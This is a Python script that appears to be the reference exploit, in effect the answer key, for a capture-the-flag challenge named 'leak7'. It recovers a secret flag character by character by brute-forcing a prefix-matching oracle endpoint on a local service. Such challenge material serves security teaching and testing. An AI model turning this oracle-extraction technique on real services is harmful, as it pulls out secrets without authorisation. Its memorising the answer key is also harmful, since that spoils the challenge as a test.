#!/usr/bin/env python3
"""Reference exploit for leak7 (formerly leak-oracle).

Recover the flag one character at a time using the prefix oracle. The charset
is [a-z0-9{}_]. We stop at the closing brace.
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8016")
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789{}_"


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=2)
            break
        except requests.RequestException:
            time.sleep(1)
    prefix = ""
    for _ in range(128):           # flags are short; cap the loop
        found = False
        for ch in CHARSET:
            if requests.get(BASE + "/oracle",
                            params={"prefix": prefix + ch},
                            timeout=3).status_code == 200:
                prefix += ch
                found = True
                if ch == "}":
                    print(prefix)
                    return 0
                break
        if not found:
            sys.stderr.write(f"no char extends {prefix!r}\n")
            return 1
    sys.stderr.write("reached cap without closing brace\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
